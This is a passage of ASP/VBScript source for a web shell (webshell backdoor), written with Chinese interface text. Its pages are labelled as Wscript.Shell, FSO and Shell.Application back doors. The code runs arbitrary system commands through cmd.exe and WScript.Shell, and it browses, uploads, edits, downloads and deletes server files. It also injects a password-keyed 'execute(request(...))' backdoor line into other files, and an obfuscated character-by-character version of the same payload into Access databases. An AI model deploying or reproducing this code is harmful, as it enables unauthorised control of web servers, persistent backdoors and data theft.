										&nbsp;添加数据 = INSERT INTO [TableName](USER,PASS) VALUES(\'myid\',\'mypass\')<br>
										&nbsp;删除数据 = DELETE FROM [TableName] WHERE ID=100<br>
										&nbsp;修改数据 = UPDATE [TableName] SET USER=\'myid\' WHERE ID=100<br>
										&nbsp;建数据表 = CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER 
										VARCHAR(50))<br>
										&nbsp;删数据表 = DROP TABLE [TableName]<br>
										&nbsp;添加字段 = ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)<br>
										&nbsp;删除字段 = ALTER TABLE [TableName] DROP COLUMN PASS
									</td>
								</tr>
							</table>
						</td>
					</tr>
	</form>
</table>
<%		
		conn.close
		set rs=nothing
		set conn=nothing
		set rsTable=nothing
	end sub
	
	function getDataType(typeId)
		select case typeId
			case 130
				getDataType="文本"
			case 2
				getDataType="整型"
			case 3
				getDataType="长整型"
			case 7
				getDataType="日期/时间"
			case 5
				getDataType="双精度型"
			case 11
				getDataType="是/否"
			case 128
				getDataType="OLE 对象"
			case else
				getDataType=typeId
		end select
	end function
	
	sub accessInject()
		dim rs,conn,sqlStr,connStr
		sqlStr=request("sqlStr")
		if lcase(left(sqlStr,4))="sql:" then
			onErr("插入只对ACCESS数据库有效!")
		 else
			connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source="&sqlStr
		end if
		set rs=server.createObject("adodb.recordSet")
		set conn=server.createObject("adodb.connection")

		on error resume next
		conn.open connStr
		chkErr err,"无法打开: "&sqlStr

		if notdownloadsExists=true then
			conn.execute("drop table notdownloads")
		end if

		conn.execute("create table notdownloads(notdownloads oleobject)")

		rs.open "notdownloads",conn,1,3
		rs.addnew
		rs("notdownloads").appendchunk(chrB(asc("<"))&chrB(asc("%"))&chrB(asc("e"))&chrB(asc("x"))&chrB(asc("e"))&chrB(asc("c"))&chrB(asc("u"))&chrB(asc("t"))&chrB(asc("e"))&chrB(asc("("))&chrB(asc("r"))&chrB(asc("e"))&chrB(asc("q"))&chrB(asc("u"))&chrB(asc("e"))&chrB(asc("s"))&chrB(asc("t"))&chrB(asc("("))&chrB(asc(""""))&chrB(asc(clientPassword))&chrB(asc(""""))&chrB(asc(")"))&chrB(asc(")"))&chrB(asc("%"))&chrB(asc(">"))&chrB(asc(" ")))
	    rs.update
    	rs.close
		
		echo "<script language=""javascript"">alert('插入成功!');history.back();</script>"
		
		conn.close
		set rs=nothing
		set conn=nothing
	end sub

	sub pageUpload()
		isIn(2)
		dim theAct,thePath,fileName
		theAct=request("theAct")
		thePath=request("thePath")
		fileName=request("fileName")
		
		showTitle("其它操作页面")
		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
		if theAct="upload" then
			streamUpload thePath,fileName
			echo "<script language=""javascript"">location.href='?pageName=upload';</script>"
		end if
%>
<TABLE class="table1" cellSpacing="1" cellPadding="1" width="100%" border="0" ID="Table14">
	<form method="post" enctype="multipart/form-data" action="?pageName=upload&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);" ID="Form3">
		<TR>
			<TD class="tr1">
				<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0" ID="Table15">
					<tr>
						<TD colspan="2"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b><%=request.serverVariables("server_name")%>- 
									Adodb.Stream File Upload :::...</b></TD>
					</tr>
					<tr>
						<td class="td1" colspan="2">
							<input name="file" type="file" size="25" ID="File2"> 保存为 <input name="fileName" type="text" value="<%=thePath%>" size="40" ID="Text4">
							<input name="Submit" type="submit" id="Submit4" value="上 传" onClick="this.form.action+='&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;">
							<input type="checkbox" name="writeMode" value="True" ID="Checkbox2">覆盖模式
						</td>
					</tr>
				</TABLE>
			</TD>
		</TR>
	</form>
	<TR>
		<TD class="tr1">
			<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0" ID="Table16">
				<tr>
					<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT> <FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff">
							<b>
								<%=request.serverVariables("server_name")%>
								- 数制转换 :::...</b></TD>
				</tr>
				<tr>
					<td class="td1">
						<input type="text" name="text9" value="字符和数字转10和16进制" size="30"> <input name="按钮" type="button" onclick="main();" value="转">
						<input type="text" name="vars" value="16进制转10进制和字符" size="30"> <input name="按钮2" type="button" onClick="main2();" value="转">
					</td>
				</tr>
			</TABLE>
		</TD>
	</TR>
	<script language="vbs">
	sub main()
		base=document.all.text9.value
		If IsNumeric(base) Then
			cc=hex(cstr(base))
			alert("10进制为"&base) 
			alert("16进制为"&cc)
			exit sub
		end if 
		aa=asc(cstr(base))
		bb=hex(aa)
		alert("10进制为"&aa) 
		alert("16进制为"&bb)
	end sub
	sub main2()
		If document.all.vars.value<>"" Then
			Dim nums,tmp,tmpstr,i
			nums=document.all.vars.value
			nums_len=Len(nums)
		For i=1 To nums_len
		    tmp=Mid(nums,i,1)
		    If IsNumeric(tmp) Then
    		    tmp=tmp * 16 * (16^(nums_len-i-1))
	    	Else
	        	If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then 
    	        	alert("你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。")
	        	    exit sub
		        End If
    		    tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))
		    End If
        	tmpstr=tmpstr+tmp
		Next
		alert("转换的10进制为:"&tmpstr&"其字符值为:"&chr(tmpstr))
		End If
	end sub
	</script>
	<form method="post" target="_blank" ID="Form4">
		<TR>
			<TD class="tr1">
				<TABLE cellSpacing="0" cellPadding="1" width="100%" border="0" ID="Table17">
					<tr>
						<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b><%=request.serverVariables("server_name")%>- 
									冰狐浪子ASP后门执行 :::...</b></TD>
					</tr>
					<tr>
						<td align="center" class="td1">&nbsp;表单提交地址: <input name="theAction" type="text" id="theAction" value="http://" size="75">
							<input name="Submit422" type="button" class="inputLogin" onClick="this.form.sharp.rows+=6;"
								value="+" ID="Button5"> <input name="Submit42" type="button" class="inputLogin" onClick="if(this.form.sharp.rows&gt;10){this.form.sharp.rows-=6;}"
								value="-" ID="Button6">
						</td>
					</tr>
					<tr>
						<td align="center" class="td3">
							<textarea name="<%=clientPassword%>" id="sharp" cols="100" rows="10">
fsoSaveToFile "物理路径\文件名",request("fileContent")

sub fsoSaveToFile(thePath,fileContent)
	dim fso,theFile
	set fso=server.createObject("scripting.fileSystemObject")
	set theFile=fso.openTextFile(thePath,2,true)
	theFile.write fileContent
	theFile.close
	echo "文件保存成功!"
	set fso=nothing
	set theFile=nothing
end sub

sub echo(str)
    response.write(str)
end sub
							</textarea>
						</td>
					</tr>
					<tr>
						<td class="td2" align="center"><FONT color="red">提示：上面文本框用来放要执行的代码,下面文本框用来传递其它数据;下面的文本框的名字是fileContent</FONT></td>
					</tr>
					<tr>
						<td align="center" class="td3"><textarea name="fileContent" cols="100" rows="10" id="fileContent">fileContent</textarea></td>
					</tr>
					<tr>
						<td align="center" class="td2">
							<input type="submit" name="Submit3" value="提 交" onClick="this.form.action=this.form.theAction.value;"
								ID="Submit6"> <input type="reset" name="Submit32" value="重 置" ID="Reset2">
						</td>
					</tr>
				</TABLE>
			</TD>
		</TR>
	</form>
	<form>
		<TR>
			<TD class="tr1">
				<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0" ID="Table18">
					<tr>
						<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT> <FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff">
								<b>
									<%=request.serverVariables("server_name")%>
									- 网页代码常用加解密 :::...</b></FONT></TD>
					</tr>
					<tr>
						<td align="center" class="td3">
							<textarea cols="100" name="Word" onChange="SetWords(this)" rows="6" ID="Textarea1"></textarea><br>
							<input name="encode" onClick="SetNewWords1(this.form)" type="button" value="Escape加密" ID="Button7">
							<INPUT name="uncode" onclick="SetNewWords(this.form)" type="button" value="Escape解密" ID="Button8">
							<input type="button" name="Submit2" value="Encode加密" onclick="this.form.NewWords.value=screncode(this.form.Word.value,'JS')"
								ID="Button9"> <input type="button" name="Submit2" value="Encode解密" onclick="this.form.NewWords.value=strdec(this.form.Word.value)"
								ID="Button10"><br>
							<textarea cols="100" name="NewWords" rows="6" ID="Textarea2"></textarea>
						</td>
					</tr>
	</form>
</TABLE>
</TD> </TR> </form>
<TR>
	<TD class="tr1">
		<TABLE cellSpacing="0" cellPadding="1" width="100%" border="0" ID="Table26">
			<tr>
				<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT> <FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff">
						<b>
							<%=request.serverVariables("server_name")%>
							- 直接写入文件 :::...</b></FONT></TD>
			</tr>
			<%
						dim objFSO,fdata,objCountFile
						
						on error resume next
						
						Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
						
						if Trim(request("syfdpath"))<>"" then
							fdata = request("cyfddata")
							Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)
							objCountFile.Write fdata
							if err =0 then
								echo "<script language=""javascript"">alert('写入成功!');</script>"
							else
								echo "<script language=""javascript"">alert('写入失败!');</script>"
							end if
							err.clear
						end if
						
						objCountFile.Close
						
						Set objCountFile=Nothing
						Set objFSO = Nothing
					%>
			<form action='' method="post">
				<tr>
					<td class="td1">&nbsp;保存文件的绝对路径-<input type="text" name="syfdpath" width="32" size="40">包括文件名-<font color="red">如<% =sErvEr.mAppAth(REquEst.SErvErVAriAblEs("SCRIPT_NAME")) %></font></td>
				</tr>
				<tr>
					<td class="td3" align="center"><textarea name="cyfddata" cols="100" rows="10" width="32"></textarea></td>
				</tr>
				<tr>
					<td class="td3" align="center"><input type="submit" value="保存"></td>
				</tr>
			</form>
		</TABLE>
	</TD>
</TR>
</table>
<%
	end sub

	sub pageCmdShell()
		isIn(2)
		dim cmdStr,cmdPath,cmdResult
		cmdStr=request("cmdStr")
		cmdPath=request("cmdPath")
		
		showTitle("Shell操作")
		
		if cmdPath="" then
			cmdPath="cmd.exe"
		end if

		if cmdStr<>"" then
			if instr(lcase(cmdPath),"cmd.exe")>0 or instr(lcase(cmdPath),lcase(myCmdDotExeFile))>0 then
				cmdResult=doCmdRun(cmdPath&" /c "&cmdStr)
			 else
		 		if cmdPath="wscriptShell" then
					cmdResult=doCmdRun(cmdStr)
				 else
					cmdResult=doCmdRun(cmdPath&" "&cmdStr)
				end if
			end if
		end if
		
		echo "<body onload=""document.forms[0].cmdStr.focus();"">"
%>
<TABLE class="table1" cellSpacing="1" cellPadding="1" width="100%" border="0" ID="Table19">
	<form action="?pageName=cmdShell" method="post" onSubmit="this.Submit.disabled=true" ID="Form5">
		<TR>
			<TD class="tr1" colspan="2">
				<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0" ID="Table20">
					<tr>
						<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT> <FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff">
								<b>
									<%=request.serverVariables("server_name")%>
									- Wscript.Shell Back Door :::...</b></TD>
					</tr>
					<tr>
						<td class="td1">&nbsp;路径: <input name="cmdPath" type="text" id="cmdPath" value="<%=cmdPath%>" size="65">
							<input type="button" name="Submit2" value="使用wscript.shell" onClick="this.form.cmdPath.value='wscriptShell';">
						</td>
					</tr>
					<tr>
						<td class="td1">&nbsp;命令/参数: <input name="cmdStr" type="text" id="cmdStr" value="<%=server.htmlEncode(cmdStr)%>" size="60">
							<input type="submit" name="Submit" value="运 行">
						</td>
					</tr>
					<tr>
						<td class="td2" align="center"><FONT color="red">&nbsp;提示：只在这里执行单步程序(程序执行开始到结束不需要人工干预),不然本程序会无法正常工作;并且在服务器生成一个不可结束的进程.</FONT></td>
					</tr>
					<tr>
						<td align="center" class="td3">
							<textarea name="cmdResult" cols="100" rows="25" id="cmdResult"><%=server.htmlEncode(cmdResult)%></textarea>
						</td>
					</tr>
				</TABLE>
			</TD>
		</TR>
	</form>
</TABLE>
<%
		echo "</body>"
	end sub

	function doCmdRun(cmdStr)
		on error resume next
		doCmdRun=ws.exec(cmdStr).stdOut.readAll()
		if err then
			err.clear
			ws.run cmdStr&" > "&server.mapPath(".")&"\001.tmp",0,true
			doCmdRun=fso.openTextFile(server.mapPath(".")&"\001.tmp")
			if err then
				doCmdRun=streamReadFromFile(server.mapPath(".")&"\001.tmp","gb2312")
			end if
		end if
	end function

	sub pageApp()

		isIn(2)

		dim theAct,dirToView,dirCopyTo,dirCopyFrom,dirMoveTo,dirMoveFrom,appExePath,appExeFile
		theAct=request("theAct")
		dirToView=request("dirToView")
		dirCopyTo=request("dirCopyTo")
		dirCopyFrom=request("dirCopyFrom")
		dirMoveTo=request("dirMoveTo")
		dirMoveFrom=request("dirMoveFrom")
		appExePath=request("appExePath")
		appExeFile=request("appExeFile")
		
		showTitle("application操作页面")
		
		select case theAct
			case "dirView"
				viewDir(dirToView)
			case "dirCopy"
				dirOperate dirCopyFrom,dirCopyTo,"copy"
			case "dirMove"
				dirOperate dirMoveFrom,dirMoveTo,"move"
			case "appExe"
				exeApp appExePath,appExeFile
		end select

%>
<TABLE class="table1" cellSpacing="1" cellPadding="1" width="100%" border="0" ID="Table7">
	<TR>
		<TD class="tr1">
			<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0" ID="Table8">
				<tr>
					<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT> <FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff">
							<b>
								<%=request.serverVariables("server_name")%>
								- Shell.Application Back Door :::..</b></TD>
				</tr>
			</TABLE>
		</TD>
	</TR>
	<TR>
		<TD>
			<TABLE class="table1o1" cellSpacing="1" cellPadding="3" width="100%" border="0" ID="Table9">
				<form method="post" action="?pageName=app&theAct=dirView" onsubmit="this.Submit.disabled=true;"
					ID="Form6">
					<tr>
						<td class="td1" width="50%" align="right">
							输入要浏览的目录,最后要加"\" <input name=dirToView type=text id="Text7" value="<%=dirToView%>" size="52">
						</td>
						<td class="td1" width="50%">
							<input type="submit" name="Submit" value="GO" ID="Submit5">
						</td>
					</tr>
				</form>
				<form method="post" action="?pageName=app&theAct=dirCopy" ID="Form7">
					<tr>
						<td class="td2" align="right">
							把文件(夹) <input name=dirCopyFrom type=text id="Text8" value="<%=dirCopyFrom%>" size="30" onsubmit="this.Submit2.disabled=true;">
							复制到 <input name=dirCopyTo type=text id="Text9" value="<%=dirCopyTo%>" size="30">
						</td>
						<td class="td2">
							<input type="submit" name="Submit2" value="GO" ID="Submit7">&nbsp;执行复制(最后不要加\)
						</td>
					</tr>
				</form>
				<form method="post" action="?pageName=app&theAct=dirMove" onsubmit="this.Submit3.disabled=true;"
					ID="Form8">
					<tr>
						<td class="td1" align="right">
							把文件(夹) <input name=dirMoveFrom type=text id="Text10" value="<%=dirMoveFrom%>" size="30">
							移动到 <input name=dirMoveTo type=text id="Text11" value="<%=dirMoveTo%>" size="30">
						</td>
						<td class="td1">
							<input type="submit" name="Submit3" value="GO" ID="Submit8">&nbsp;执行复制(最后不要加\)
						</td>
					</tr>
				</form>
				<form method="post" action="?pageName=app&theAct=appExe" onsubmit="this.Submit4.disabled=true;"
					ID="Form9">
					<tr>
						<td class="td2" align="right">
							程序路径&nbsp;&nbsp;&nbsp;<input name=appExePath type=text id="Text12" value="<%=appExePath%>" size="30" >
							程序名 <input name=appExeFile type=text id="Text13" value="<%=appExeFile%>" size="30">
						</td>
						<td class="td2">
							<input type="submit" name="Submit4" value="GO" ID="Submit9">&nbsp;在后台运行程序(不可以加参数)
						</td>
					</tr>
				</form>
			</TABLE>
		</TD>
	</TR>
</TABLE>
<div id="loaded" style="display:none;"><iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="475"></iframe></div>
<%
	end sub
	
	sub viewDir(dirToView)
		dim sa,co,fod
		if mid(dirToView,2,1)<>":" then
			onErr("请填写真实存在的绝对路径!")
		end if
		set sa=server.createObject(shellStr&"."&applicationStr)
		set fod=sa.namespace(dirToView)
		echo "<TABLE class=""table1"" cellSpacing=""0"" cellPadding=""1"" width=""100%"" border=""0"">"
		on error resume next
		if getParentFolder(dirToView)<>"" then
			echo "<tr><td colspan=2 class=""td1"">&nbsp;<a href=""?pageName=app&theAct=dirView&dirToView="&encodeForUrl(getParentFolder(dirToView),false)&"""><font color=red>↑上级目录</font></a></td></tr>"
		end if
		for each co in fod.items
			if co.isFolder then
				echo "<tr><td class=""td2"">&nbsp;<FONT face=wingdings color=red>0</FONT>&nbsp;<a href=""?pageName=app&theAct=dirView&dirToView="&encodeForUrl(co.path,false)&""">"&co.path&"</a></td><td align=right class=""td2"">"&getTheSize(co.size)&"&nbsp;</td></tr>"
			 else
				echo "<tr><td class=""td2"">&nbsp;<FONT face=wingdings color=lime>&#50;</FONT>&nbsp;<a href=""javascript:;"" onclick=""stream_downIt('"&encodeForUrl(co.path,true)&"');"">"&co.path&"</a></td><td align=right class=""td2"">"&getTheSize(co.size)&"&nbsp;</td></tr>"
			end if
		next
		if err then
			err.clear
			onErr "路径未找到!"
		end if
		echo "</table>"
		set sa=nothing
		set fod=nothing
	end sub
		
	sub dirOperate(dirFrom,dirTo,theAct)
		dim i,sa,fod1,fod2,path,path2,foditem

		if dirFrom="" or dirTo="" then
			onErr("请完整填写各项!")
		end if

		if mid(dirFrom,2,1)<>":" or mid(dirTo,2,1)<>":" then
			onErr("请填写真实存在的绝对路径!")
		end if
		
		set sa=server.createobject(shellStr&"."&applicationStr)

		on error resume next
		set fod1=sa.namespace(dirTo)
		chkErr err,err.description&"');history.back('"

		path2=split(dirFrom,"\")(uBound(split(dirFrom,"\")))
		path=left(dirFrom,len(dirFrom)-len(path2)-1)
		
		if len(path)=2 then
			path=path&"\"
		end if
		
		set fod2=sa.namespace(path)
		set foditem=fod2.parsename(path2)
		chkErr err,err.description&"');history.back('"
		
		if theAct="copy" then
			fod1.copyHere foditem
			chkErr err,err.description&"');history.back('"
		end if
		
		if theAct="move" then
			fod1.moveHere foditem
			chkErr err,err.description&"');history.back('"
		end if
		
		echo "<center>命令成功完成!</center><br>"
		
		set sa=nothing
		set fod1=nothing
		set fod2=nothing
		set foditem=nothing
	end sub

	sub exeApp(appExePath,appExeFile)
		dim sa
		set sa=server.createObject(shellStr&"."&applicationStr)
		on error resume next
		sa.namespace(appExePath).items.item(appExeFile).invokeverb
		chkErr err,err.description&"');history.back('"
		echo "<center>命令成功完成!</center><br>"
		set sa=nothing
	end sub

	sub pageFso()
		dim key,list,path,theAct,toPath,thePath,driveStr,fileName,fileContent
		isIn(2)
		key=request("key")
		path=request("path")
		theAct=request("theAct")
		toPath=request("toPath")
		thePath=request("thePath")
		fileName=request("fileName")
		fileContent=request("fileContent")
		
		if thePath="" then
			thePath=server.mapPath(".")
		end if
		
		if path="" then
			path=thePath
		end if
		
		showTitle("FSO操作页面")
		
		select case theAct
			case "inject"
				fsoInject(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "edit"
				fsoEditFile(thePath)
				response.end
			case "save"
				fsoSaveToFile thePath,fileContent
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "delFile"
				fsoDelFile(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "delFolder"
				fsoDelFolder(thePath)
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "saveAs"
				fsoSaveAs thePath,toPath
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "createFile"
				if not fso.fileExists(thePath&"\"&request("theName")) then
					fso.createTextFile thePath&"\"&request("theName")
					chkErr err,err.description
				end if
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "createFolder"
				if not fso.folderExists(thePath&"\"&request("theName")) then
					fso.createFolder thePath&"\"&request("theName")
					chkErr err,err.description
				end if
				echo "<script language=""javascript"">top.location.reload();</script>"
				response.end
			case "searchFolder"
				set path=fso.getFolder(path)
				searchFolder path,key
				response.end
			case "upload"
				streamUpload thePath,fileName
				echo "<script language=""javascript"">location.href='?pageName=fso&thePath="&encodeForUrl(thePath,true)&"';</script>"
		end select

		for each list in fso.drives
			driveStr=driveStr&"<a href=""?pageName=fso&thePath="&list.driveLetter&":\"">"&list.driveLetter&":\</a> "
		next
%>
<TABLE class="table1" cellSpacing="1" cellPadding="1" width="100%" border="0" ID="Table11">
	<TR>
		<TD class="tr1" colspan="2">
			<TABLE cellSpacing="0" cellPadding="0" width="100%" border="0" ID="Table23">
				<tr>
					<TD><FONT face="webdings" color="#ffffff">&nbsp;8</FONT> <FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff">
							<b>&nbsp;<%=request.serverVariables("server_name")%>- FSO Back Door :::...</b></TD>
				</tr>
			</TABLE>
		</TD>
	</TR>
	<TR class="td1">
		<TD colspan="2">
			<TABLE class="table1o1" cellSpacing="1" cellPadding="1" width="100%" border="0" ID="Table24">
				<form method="post" onSubmit="this.Submit3.disabled=true;" action="?pageName=fso" ID="Form10">
					<tr>
						<td class="td1" align="center" colspan="2">
							切换盘符:<%=driveStr%>
							本机局域网地址:
							<%
								on error resume next
        						echo "\\"&net.computerName&"\"&net.userName
								chkErr err,err.description
							%>
						</td>
					</tr>
					<tr>
						<td class="td2" width="50%" align="right">PATH：<input name="thePath" type="text" id="Text14" value="<%=thePath%>" size="70"></td>
						<td class="td2" width="50%"><input type="submit" name="Submit3" value="查看" onclick="location.href='?pageName=fso&thePath='+this.form.thePath.value;this.disabled=true;"
								ID="Submit10"></td>
					</tr>
				</form>
				<form method="post" action="?pageName=fso&theAct=searchFolder" onsubmit="if(this.key.value==''){alert('请填写关键字!');return false;}else{this.Submit5.disabled=true;}"
					target="_blank" ID="Form11">
					<tr>
						<td class="td2" align="right">在文件 <input name="path" type="text" id="path" value="<%=path%>" size="33">中搜索<input name="key" type="text" id="key" value="<%=key%>" size="30"></td>
						<td class="td2"><input type="submit" name="Submit5" value="查找" ID="Submit11">〖用于查找存在的木马〗</td>
					</tr>
				</form>
				<form method="post" ID="Form12">
					<tr>
						<td class="td2" align="right"><input name="theName" type="text" id="theName2" size="70"></td>
						<td class="td2">
							<input type="button" name="Submit2" value="新建文件" onClick="if(this.form.theName.value==''){alert('请填写文件名!');this.form.theName.focus();}else{fileEditor.location.href='?pageName=fso&thePath=<%=encodeForUrl(thePath,true)%>&theAct=createFile&theName='+this.form.theName.value;this.disabled=true;}" ID="Button11">
							<input type="button" name="Submit4" value="新建目录" onClick="if(this.form.theName.value==''){alert('请填写文件夹名!');this.form.theName.focus();}else{fileEditor.location.href='?pageName=fso&thePath=<%=encodeForUrl(thePath,true)%>&theAct=createFolder&theName='+this.form.theName.value;this.disabled=true;}" ID="Button12">
							<span class="warningColor">〖新建文件和新建目录不能同名〗</span>
						</td>
					</tr>
				</form>
				<form method="post" enctype="multipart/form-data" action="?pageName=fso&theAct=upload&thePath=<%=encodeForUrl(thePath,false)%>" onsubmit="return upload_canSubmit(this);" ID="Form13">
					<tr>
						<td class="td2" align="right"><input name="file" type="file" ID="File3">保存为 <input name="fileName" type="text" value="<%=thePath%>" size="40" ID="Text15"></td>
						<td class="td2"><input name="Submit" type="submit" id="Submit" value="上传"></td>
					</tr>
				</form>
			</TABLE>
		</TD>
	</TR>
	<tr>
		<td valign="top" class="td2" width="30%"><%call fsoGetFolderList(thePath,true)%></td>
		<td valign="top" class="td2" width="70%"><%call fsoGetFolderList(thePath,false)%></td>
	</tr>
	<tr>
		<td class="td3" colspan="2">
			<div id="loaded" style="display:none;"><iframe id="fileEditor" frameborder="0" scrolling="no" valign="top" width="100%" height="410"></iframe></div>
		</td>
	</tr>
</TABLE>
<a name="foot"></a>
<%
	end sub
	
	sub fsoEditFile(thePath)
		dim theFile
		set theFile=fso.openTextFile(thePath,1,false)
		on error resume next
%>
<table border="1" align="center" cellpadding="1" cellspacing="1" ID="Table25">
	<form method="post" action="?pageName=fso&theAct=save" onsubmit="if(confirm('您确认要保存当前文件吗?')){this.Submit.disabled=true;this.Submit2.disabled=true;this.Submit3.disabled=true;}else{return false;}"
		ID="Form14">
		<tr>
			<td><input name="thePath" type="text" id="Text16" value="<%=thePath%>" size=100></td>
		</tr>
		<tr>
			<td><textarea name="fileContent" cols="100" rows="25" id="Textarea3"><%=server.htmlEncode(theFile.readAll())%></textarea></td>
		</tr>
		<tr>
			<td align="center">
				<input type="button" name="Submit" value="保 存" onClick="if(confirm('确认保存修改?')){this.form.submit();}"
					ID="Button13"> <input type="reset" value="重 置" ID="Reset1" NAME="Reset1">
			</td>
		</tr>
	</form>
</table>
<%
		err.clear
		set theFile=nothing
		
	end sub

	sub fsoGetFolderList(thePath,showFolder)
		dim ext,flag,list,theHref,theFiles,fileName,theFolder,theFolders
		
		if not fso.folderExists(thePath) then
			onErr("路径错误或者盘空或者没有权限的访问!")
		end if
		
		if len(thePath)=2 then
			thePath=thePath&"\"
		end if
		
		set theFolder=fso.getFolder(thePath)
		set theFiles=theFolder.files
		set theFolders=theFolder.subFolders

		if showFolder=true and getParentFolder(thePath)<>"" then
			echo "&nbsp;<a href=""?pageName=fso&thePath="&encodeForUrl(getParentFolder(thePath),false)&"""><font color=red>↑回上级目录</font></a><br>"
		end if

		if showFolder=true then
			for each list in theFolders
				echo "&nbsp;<a href=""?pageName=fso&thePath="&encodeForUrl(list.path,false)&"""><font face=wingdings color=red>0</font> "
				echo replace(replace(lcase(list.path),lcase(thePath),""),"\","")&""
				echo "</a> <a href=javascript:; onclick=""fso_delFolder('"&encodeForUrl(list.path,true)&"')"">×删除</a><br>"
			next
		 else
			echo "<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""0""><tr align=""center"">"
			echo "<td class=""td1"">文件名</TD><TD class=""td1"">大小</TD><TD class=""td1"">时间</TD>"
			echo "<TD class=""td1"">属性</TD><TD class=""td1"">类型</TD><TD class=""td1"">文件操作</TD></tr>"
			for each list in theFiles
				ext=split(list.path,".")(uBound(split(list.path,".")))
				flag=instr(lcase(editableFileExt),lcase("$"&ext&"$"))
				fileName=replace(replace(lcase(list.path),lcase(thePath),""),"\","")
				if instr(lcase(list.path),lcase(server.mapPath("."))) then
					theHref=""
					theHref=mid(theHref&replace(lcase(list.path),lcase(server.mapPath(".")),""),2)
					echo "<tr><td class=""td2"">&nbsp;<a href="""&theHref&""" target=""_blank"">"
					if getStrLen(fileName)>40 then
						fileName=getCutStr(fileName,40)&".."
					end if
					echo fileName&"</a></td>"
				 else
					echo "<tr>"
					echo "	<td class=""td2"">&nbsp;"
					echo "		<font style=""cursor: hand;"" title=""文件名:"&fileName&chr(13)&"类型:"&list.type&chr(13)&"属性:"&list.Attributes&chr(13)&"时间:"&list.DateLastModified&""" target=""_blank"">"
					if getStrLen(fileName)>40 then
						fileName=getCutStr(fileName,40)&".."
					end if
					echo fileName&"</font></td>"
				end if
				echo "<td class=""td2"" align=""right"">" & getTheSize(list.size) & "</td><td class=""td2"" align=""right"">"&list.DateLastModified&"</td><td class=""td2"" align=""right"">"&list.Attributes&chr(13)&"</td>"
				echo "<td class=""td2"" align=""right"">"&list.type&chr(13)&"</td><td class=""td2"" align=center>"
				if flag>0 then
					echo "<a href=#foot onclick=""fso_editIt('"&encodeForUrl(list.path,true)&"');""><font color=red>Edit</font></a> "
				end if
				echo "<a href=javascript:; onclick=""fso_saveAs('"&encodeForUrl(list.path,true)&"');""><font color=red>SaveAs</font></a> "
				echo "<a href=javascript:; onclick=""stream_downIt('"&encodeForUrl(list.path,true)&"');""><font color=red>Down</font></a> "
				echo "<a href=javascript:; onclick=""fso_delFile('"&encodeForUrl(list.path,true)&"')""><font color=red>Del</font></a> "
				if flag>0 then
					echo "<a href=javascript:; onclick=""fso_inject('"&encodeForUrl(list.path,true)&"')""><font color=red>Inject</font></a>"
				end if
				echo "</td></tr>"
			next
			echo "</table>"
		end if
	end sub
	
	sub fsoSaveAs(thePath,toPath)
		if lTrim(thePath)=lTrim(toPath) then
			echo "<script>alert('源路径与目标路径相同,操作停止!');</script>"
			response.end
		end if
	 	if fso.fileExists(thePath) then 
			fso.copyFile thePath,toPath
			echo "<script language=""javascript"">alert('另存为操作成功!');</script>"
		 else
			echo "<script>alert('请确认源文件存在！');history.back();</script>"
		end if
	end sub
	
	sub fsoInject(thePath)
		dim theFile
		set theFile=fso.openTextFile(thePath,8,True,0)
		theFile.writeLine(" <script language=""vbscript"" runat=server>if request("""&clientPassword&""")<>"""" then execute(request("""&clientPassword&"""))</script>")
		theFile.close
		echo "<script language=""javascript"">alert('插入成功!请用冰狐浪子asp后门来访问你插入的文件"&request("path")&"默认密码是1866574');</script>"
		set theFile=nothing
	end sub
	
	sub fsoSaveToFile(thePath,fileContent)
		dim theFile
		set theFile=fso.openTextFile(thePath,2,true)
		theFile.write fileContent
		theFile.close
		echo "文件保存成功! [<a href="""&request.serverVariables("http_referer")&""">返回</a>]"
		set theFile=nothing
	end sub
	
	sub fsoDelFile(thePath)
		dim theFile
		set theFile=fso.getFile(thePath)
		theFile.delete true
		set theFile=nothing
	end sub
	
	sub fsoDelFolder(thePath)
		fso.deleteFolder thePath,true
	end sub
	
	sub searchFolder(folder,str)
		dim ext,n,title,theFile,theFolder
		for each theFile In folder.Files
			ext=split(theFile,".")(uBound(split(theFile,".")))
			if lcase(ext)="asp" or lcase(ext)="asa" or lcase(ext)="cer"  or lcase(ext)="cdx" then
				if searchFile(theFile,str,title) then
					echo fileLink(theFile,title)
					n=n+1
				end if
			end if
		next
		for each theFolder in folder.subFolders
